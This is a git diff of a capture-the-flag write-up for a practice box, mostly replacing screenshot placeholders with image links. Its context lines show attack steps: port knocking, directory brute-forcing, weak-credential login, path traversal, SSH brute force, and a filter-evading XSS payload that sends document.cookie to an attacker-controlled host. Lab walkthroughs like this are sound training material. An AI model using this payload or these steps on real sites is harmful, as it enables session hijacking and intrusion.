@@ -62,7 +62,7 @@ The "knock, knock" jokes might be a hint about port knocking.
 
 3. Open the `trace.pcapng` file in Wireshark and filter requests by the internal IP address `192.168.236.131` to identify suspicious network activity.
 
-[SCREEN01]
+<img width="1575" height="314" alt="SCREEN01" src="https://github.com/user-attachments/assets/abd20031-b7a5-475f-86be-ce0186e4c400" />
 
 4. By examining the TCP packets sent to various ports, we can extract a port knocking sequence. Look at the destination ports in chronological order.
 
@@ -107,6 +107,8 @@ gobuster dir -u https://<TARGET_IP>:8080 -w /usr/share/wordlists/dirbuster/direc
 
 7. From the certificate details, we find the email address: `zac@misguided_ghosts.thm`.
 
+<img width="1323" height="731" alt="SCREEN02" src="https://github.com/user-attachments/assets/3866c9ff-b93e-4751-8065-5e8e3c3e224e" />
+
 8. Navigate to `https://<TARGET_IP>:8080/login` and try common weak credentials using the discovered username: `zac:zac`.
 
 9. Start a simple HTTP server on your attacking machine to receive stolen cookies:
@@ -117,7 +119,7 @@ python -m http.server
 
 10. The dashboard appears to have functionality to create posts. Create a new post with the following XSS payload in the Title or Subtitle field: `&lt;sscriptcript&gt;var i = new Image(); i.src = "http://<ATTACKER_IP>:8000/" + document.cookie;&lt;/sscriptcript&gt;`
 
-[SCREEN03]
+<img width="1089" height="229" alt="SCREEN03" src="https://github.com/user-attachments/assets/33f5b154-3cd3-47de-a192-ea83f50712cd" />
 
 After submitting the post, monitor your HTTP server logs. When an admin views the post, their session cookie will be sent to your server.
 
@@ -139,8 +141,6 @@ gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-mediu
 A new `/photos` endpoint has been discovered that requires admin privileges.
 
 13. Navigate to `https://<TARGET_IP>:8080/photos?image=.` to test for path traversal or command injection vulnerabilities. The page lists files in the current directory, confirming a Local File Inclusion (LFI) or directory traversal vulnerability.
-
-[SCREEN04]
 
 14. Prepare a listener on your attacking machine to catch the reverse shell:
 
@@ -210,7 +210,7 @@ This is an encrypted RSA private key that needs to be decrypted.
 
 16. The RSA key headers are standard, so we can attempt to brute-force the cipher key. Use [CyberChef](https://gchq.github.io/CyberChef/) to decrypt. Try to guess key letter by letter.
 
-[SCREEN04]
+<img width="991" height="531" alt="SCREEN04" src="https://github.com/user-attachments/assets/b7a1b6ac-9fc3-438e-a355-c8120b02232a" />
 
 17. Once decrypted, save the decoded RSA key to a `id_rsa` file:
 
@@ -257,7 +257,7 @@ ls
 get passwords.bak
 ```
 
-[SCREEN05]
+<img width="846" height="219" alt="SCREEN05" src="https://github.com/user-attachments/assets/7a3e587a-a68c-4a56-8898-6498905c05a5" />
 
 22. Use the downloaded password list to brute-force SSH login for user hayley:
 
@@ -278,7 +278,7 @@ ssh hayley@<TARGET_IP>
 cat user.txt
 ```
 
-[SCREEN06]
+<img width="343" height="81" alt="SCREEN06" src="https://github.com/user-attachments/assets/b2a57270-940b-4b27-8f4a-fe0c6c838944" />
 
 ---
 
@@ -319,4 +319,4 @@ whoami
 cat /root/root.txt
 ```
 
-[SCREEN07]
+<img width="298" height="188" alt="SCREEN07" src="https://github.com/user-attachments/assets/11568cc6-e3e8-446d-9448-d5825f5d9da5" />
